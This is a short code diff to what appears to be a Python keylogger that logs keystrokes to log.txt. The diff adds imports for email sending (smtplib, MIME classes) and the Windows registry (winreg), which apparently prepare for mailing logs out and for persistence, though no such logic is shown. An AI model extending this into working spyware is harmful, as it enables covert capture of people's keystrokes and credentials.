@@ -1,9 +1,16 @@
 #libraries needed
-#pynput
-#keyboard
+#pynput     #os     #smtplib
+#keyboard   #email  #winreg
 
 #Importing necessary modules from the pynput library
 from pynput.keyboard import Key, Listener
+import os
+import sys
+import smtplib
+import time
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import winreg as reg
 
 
 #This function is called when a key is pressed and appends the key to the log.txt file
